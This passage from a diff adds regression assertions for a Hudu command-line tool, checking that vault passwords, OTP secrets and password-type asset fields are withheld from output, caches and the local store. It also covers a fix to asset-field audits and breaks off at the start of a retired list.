+     "file": "cli/internal/client/client.go",
+     "contains": "if resp.StatusCode == http.StatusForbidden && !protectedAnswer {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if answerIsProtected(ctx, path, resp) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "API returned HTML instead of JSON: %s\", method, c.displayURL(path, authHeader), protectedErrorBodyWithheld)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if shown, _, werr := c.withholdProtectedResponse(ctx, http.MethodGet, path, nil, cached, http.StatusOK, nil); werr == nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "huduLayouts"
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "return c.fetchAssetLayoutFieldTypes(ctx, layoutID)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "types, ok = s.lookupLayout(AssetLayoutID(asset))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "s.layouts[id] = layoutAnswer{types: types, ok: ok}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if err := c.refuseWithheldMarker(method, path, bodyBytes); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "func (c *Client) withholdProtectedResponse(ctx context.Context, method, path string, answered *answeredURLs, data json.RawMessage, status int, err error) (json.RawMessage, int, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "func withAnsweredURLs(ctx context.Context) (context.Context, *answeredURLs) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "func recordAnsweredURL(ctx context.Context, resp *http.Response) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "func answerIsProtected(ctx context.Context, requested string, resp *http.Response) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "const protectedErrorBodyWithheld = \"[response body withheld: Hudu password-vault and asset responses are never shown]\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "shown, ferr := huduprotect.FilterVaultBody(data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "shown, ferr := huduprotect.FilterAssetBody(data, func(layoutID string) (map[string]string, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "func (c *Client) assetLayoutFieldTypes(ctx context.Context, layoutID string) (map[string]string, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "data, status, err := c.doInternal(lookupCtx, http.MethodGet, path, nil, nil, nil, false, false)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "func (c *Client) refuseWithheldMarker(method, path string, body []byte) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "var ErrVaultResponseWithheld = errors.New(\"password-vault response withheld\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func ClassifyPath(path string) Class {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "const vaultResourceMarker = \"asset_password\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "if segment == assetResourceSegment {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func ClassifyStoreResourceType(resourceType string) Class {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "case rt == \"assets\", strings.HasPrefix(rt, \"assets-\"), strings.HasSuffix(rt, \"-assets\"):",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func VaultEntryKey(key string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "return vaultEntryKeys[key]",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func FilterVaultBody(data json.RawMessage) (json.RawMessage, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func ScrubVaultDocument(data json.RawMessage) json.RawMessage {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func FieldTypeIsSecret(fieldType string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "return !nonSecretFieldTypes[normalizeFieldType(fieldType)]",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func ParseLayoutFieldTypes(data json.RawMessage) (map[string]string, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func FilterAssetBody(data json.RawMessage, layout LayoutLookup) (json.RawMessage, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func ScrubAssetDocument(data json.RawMessage, layout LayoutLookup) json.RawMessage {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "const WithheldFieldMarker = \"[withheld: password field]\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "const StoreSchemaVersion = 14",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "merged := s.mergeIncomingResourceDataUnscrubbed(tx, resourceType, id, incoming)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "return scrubProtectedResourceData(storeLayoutLookup(tx.QueryRow), resourceType, merged)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if current < protectedRowsScrubSchemaVersion {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "rewrote, err := s.migrateScrubProtectedRows(ctx, conn)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "checkpointAfterScrub(ctx, conn)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if needs, err := readOnlyStoreNeedsScrub(ctx, db); err != nil || needs {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if err == nil && ctx.Value(readOnlyScrubUpgraded{}) != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "err = upgradeUnscrubbedStoreBeforeRead(ctx, dbPath)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "return OpenReadOnlyContext(context.WithValue(ctx, readOnlyScrubUpgraded{}, true), dbPath)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "const protectedRowsScrubSchemaVersion = 14",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "func scrubProtectedResourceData(layouts huduprotect.LayoutLookup, resourceType string, data json.RawMessage) json.RawMessage {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "func (s *Store) migrateScrubProtectedRows(ctx context.Context, conn *sql.Conn) (bool, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "if _, err := conn.ExecContext(ctx, `PRAGMA secure_delete = ON`); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "INSERT INTO resources_fts(resources_fts) VALUES('optimize')",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "typedTables, err := typedDataTables(ctx, conn)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "return huduprotect.ScrubUnknownProvenanceDocument(data, layouts)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "scrubbed := string(scrubLegacyResourceData(layouts, r.resourceType.String, json.RawMessage(r.data.String)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "_, _ = conn.ExecContext(ctx, `PRAGMA wal_checkpoint(TRUNCATE)`)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdListGet(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdSingleGet(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdEveryVerb(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdPercentEncodedPath(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdCachedSecondRead(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdLegacyCacheEntry(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdUnclassifiableIsError(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdErrorBody(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdNonVaultPathByteIdentical(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestVaultWithholdSyntheticEnvelopesPass(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold_test.go",
+     "contains": "func TestIsVaultPath(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_class_test.go",
+     "contains": "func TestProtectVaultValidationErrorWithheld(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_class_test.go",
+     "contains": "func TestProtectRedirectIntoProtectedResource(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_class_test.go",
+     "contains": "func TestProtectVaultTextBodiesWithheld(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_class_test.go",
+     "contains": "func TestProtectVaultExactAllowlistDropsAtSuffix(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_class_test.go",
+     "contains": "func TestProtectAssetPasswordFieldValues(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_class_test.go",
+     "contains": "func TestProtectWithheldMarkerNeverSent(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store_test.go",
+     "contains": "func TestProtectFunnelScrubsStoredVaultSecretOnMerge(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store_test.go",
+     "contains": "func TestProtectMigrationScrubsUpgradedStore(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store_test.go",
+     "contains": "func TestProtectFunnelScrubsClearedAssetPasswordField(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store_test.go",
+     "contains": "func TestProtectReadOnlyOpenScrubsUpgradedStore(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hudu_protect_cli_test.go",
+     "contains": "func TestProtectVaultCreateErrorCLIOutput(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hudu_vault_withhold_e2e_test.go",
+     "contains": "func TestVaultSecretsWithheldFromSyncStore(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/hudu_vault_withhold_mcp_test.go",
+     "contains": "func TestVaultSecretsWithheldFromMCPRead(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect_test.go",
+     "contains": "func TestClassifyPathByResource(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect_test.go",
+     "contains": "func TestClassifyStoreResourceTypeCoversPartitionNames(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect_test.go",
+     "contains": "func TestFieldTypeIsSecretAllowlist(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect_test.go",
+     "contains": "func TestFilterAssetBodyDecidesEveryFieldEntry(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect_test.go",
+     "contains": "func TestScrubAssetDocumentStoreRule(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect_test.go",
+     "contains": "func TestVaultEntryAllowlistIsExact(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "not_contains": "strings.HasSuffix(key, \"_at\")"
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "not_contains": "strings.HasSuffix(key, \"_at\")"
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "not_contains": "withholdVaultErrorBody"
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "not_contains": "withholdVaultErrorBody"
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "not_contains": "vaultErrorBodyRevealsSecret"
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "not_contains": "vaultErrorBodyRevealsSecret"
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "not_contains": "valueHoldsVaultSecretString"
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "not_contains": "valueHoldsVaultSecretString"
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "not_contains": "vaultErrorBodyStringField"
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "not_contains": "vaultErrorBodyStringField"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "withholdVaultSecrets("
+    },
+    {
+     "file": "cli/internal/cli/asset-passwords_list.go",
+     "contains": "List password vault entries (paginated). This CLI withholds the password and OTP secret; fetch them in the Hudu portal.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/asset-passwords_get.go",
+     "contains": "Get a single password entry (metadata only: this CLI withholds the password and OTP secret; fetch them in the Hudu portal)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/asset-passwords_get.go",
+     "contains": "\"stored in the local mirror or cached. Fetch them in the Hudu portal.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "List password vault entries (paginated). This CLI withholds the password and OTP secret; fetch them in the Hudu portal.",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "Get a single password entry (metadata only: this CLI withholds the password and OTP secret; fetch them in the Hudu portal)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/asset-passwords_list.go",
+     "not_contains": "The secret is returned only on single get, never the list, per Hudu."
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "not_contains": "The secret is returned only on single get, never the list, per Hudu."
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "The secret is returned only on single get, never the list, per Hudu."
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "The secret is returned only on single get, never the list, per Hudu."
+    },
+    {
+     "file": "press/tools-manifest.json",
+     "not_contains": "The secret is returned only on single get, never the list, per Hudu."
+    },
+    {
+     "file": "governance.md",
+     "not_contains": "never written to disk"
+    },
+    {
+     "file": "pain-point.md",
+     "not_contains": "secret value is never read or stored"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "secret values are never read"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "List password vault entries (paginated). This CLI withholds the password and OTP secret; fetch them in the Hudu portal.",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "never shown, stored or cached",
+     "min_count": 1
+    },
+    {
+     "file": "guide.md",
+     "contains": "List password vault entries (paginated). This CLI withholds the password and OTP secret; fetch them in the Hudu portal.",
+     "min_count": 1
+    },
+    {
+     "file": "README.md",
+     "contains": "never shown, stored or cached",
+     "min_count": 2
+    },
+    {
+     "file": "governance.md",
+     "contains": "**Vault secrets never leave the client.**",
+     "min_count": 1
+    },
+    {
+     "file": "pain-point.md",
+     "contains": "passwords and OTP secrets are never shown, stored or cached",
+     "min_count": 1
+    },
+    {
+     "file": "page.json",
+     "contains": "Vault passwords and OTP secrets are never shown, stored or cached",
+     "min_count": 1
+    },
+    {
+     "file": "guide.md",
+     "contains": "A store written by an older version is scrubbed the first time this version opens it",
+     "min_count": 1
+    },
+    {
+     "file": "guide.md",
+     "contains": "replaces each filled password-type asset field value with `[withheld: password field]`",
+     "min_count": 1
+    },
+    {
+     "file": "governance.md",
+     "contains": "with `[withheld: password field]`",
+     "min_count": 1
+    },
+    {
+     "file": "governance.md",
+     "contains": "carries only its HTTP status, never Hudu's error text",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "a filled password-type asset field reads `[withheld: password field]`",
+     "min_count": 1
+    },
+    {
+     "file": "README.md",
+     "contains": "The value of a password-type asset field is withheld the same way",
+     "min_count": 1
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "run `hudu-cli local-data purge --yes`, then `sync` again"
+    },
+    {
+     "file": "governance.md",
+     "not_contains": "run `hudu-cli local-data purge --yes`"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "+protectedCacheEntrySuffix)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "headers, nil)+\".json\")"
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "const protectedCacheEntrySuffix = \".hudu-protect-2.json\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "func readOnlyStoreNeedsScrub(ctx context.Context, db *sql.DB) (bool, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "AND (m.name = 'resources_fts' OR EXISTS (SELECT 1 FROM pragma_table_info(m.name) WHERE name = 'data'))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "if err := s.scrubTree(v); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "if err := checkAssetEnvelope(v); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func ScrubUnknownProvenanceDocument(data json.RawMessage, layout LayoutLookup) json.RawMessage {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "s.dropSecretKeys(v)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_nextfix_test.go",
+     "contains": "func TestProtectLegacyCacheEntryNeverServed(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_nextfix_test.go",
+     "contains": "func TestProtectAssetFieldsUnderAnyEnvelope(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_nextfix_test.go",
+     "contains": "func TestProtectLayoutTypesReadForEveryBody(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_nextfix_test.go",
+     "contains": "func TestProtectReadOnlyStampReadFailsClosed(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_nextfix_test.go",
+     "contains": "func TestProtectReadOnlyOpenScrubsUnstampedStore(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_nextfix_test.go",
+     "contains": "func TestProtectUpgradeScrubsRedirectedLegacyRows(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "ftsRows, err := conn.QueryContext(ctx, `SELECT rowid FROM resources_fts`)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "indexed[ftsRow] = true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "not_contains": "s.changed"
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "func isAssetFieldKey(key string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "if !isAssetFieldKey(key) || raw == nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "loose = loose || (key != \"label\" && key != \"value\" && key != \"field_type\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "if NormalizeLabel(key) == \"value\" && !valueIsEmpty(value) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "contains": "secret = secret || (hasEntryType && FieldTypeIsSecret(entryType)) || labelIsSecret(label, layoutTypes)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/huduprotect/huduprotect.go",
+     "not_contains": "secret = FieldTypeIsSecret(entryType)"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "ctx, protected := withProtectedSeen(ctx)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "!protected.seen.Load()",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "flag.seen.Store(true)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "if status < 200 || status > 299 {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_vault_withhold.go",
+     "contains": "if err != nil || status < 200 || status > 299 || answered.class(path) != huduprotect.None {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "fmt.Sprintf(`SELECT rowid, %s, id, data FROM %s`, typeExpr, quoted)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "`UPDATE resources SET data = ? WHERE rowid = ?`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_store.go",
+     "contains": "fmt.Sprintf(`UPDATE %s SET data = ? WHERE rowid = ?`, quoted)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_review_test.go",
+     "contains": "func TestProtectAssetOutputIsTheInspectedTree(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_review_test.go",
+     "contains": "func TestProtectRedirectedAnswerNeverCached(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/hudu_protect_review_test.go",
+     "contains": "func TestProtectNonSuccessStatusWithheld(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_review_test.go",
+     "contains": "func TestProtectUpgradeWritesTheInspectedTree(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_review_test.go",
+     "contains": "func TestProtectStoreEntryTypeNeverOverridesLayout(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hudu_protect_review_test.go",
+     "contains": "func TestProtectUpgradeScrubsRowsWithoutAnID(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "audits-read-hudu-fields-shape",
+   "class": "wrong-result-response-shape",
+   "summary": "audit completeness, layout-drift and summary read asset values from Hudu's read shape `fields` ({label,value}) as well as `custom_fields`; audit stale-passwords checks the sync record under its real name asset-passwords",
+   "why": "Hudu returns an asset's values under `fields` as label/value objects on reads (HuduAPI module Set-HuduAsset.ps1 reshapes $_.fields label/value) and takes `custom_fields` only on writes. The audits read only custom_fields, so a fully filled asset scored 0% complete and every field was reported missing. stale-passwords looked up the sync record asset_passwords while sync records asset-passwords, so it always printed the never-synced hint. Publish review round 1 (adversarial P1, Codex/adversarial P2).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/audit_shared.go",
+     "contains": "func assetFieldLabels(m map[string]any) map[string]bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/audit_shared.go",
+     "contains": "for _, key := range []string{\"fields\", \"custom_fields\"} {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/audit_completeness.go",
+     "contains": "filled := assetFieldLabels(m)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/audit_layout_drift.go",
+     "contains": "present := assetFieldLabels(m)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/audit_summary.go",
+     "contains": "filled := assetFieldLabels(m)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/audit_completeness.go",
+     "not_contains": "json.Marshal(m[\"custom_fields\"])"
+    },
+    {
+     "file": "cli/internal/cli/audit_layout_drift.go",
+     "not_contains": "json.Marshal(m[\"custom_fields\"])"
+    },
+    {
+     "file": "cli/internal/cli/audit_summary.go",
+     "not_contains": "json.Marshal(m[\"custom_fields\"])"
+    },
+    {
+     "file": "cli/internal/cli/audit_stale_passwords.go",
+     "contains": "hintIfUnsynced(cmd, db, \"asset-passwords\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hudu_asset_fields_test.go",
+     "contains": "func TestAssetFieldLabelsReadsHuduFieldsShape(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
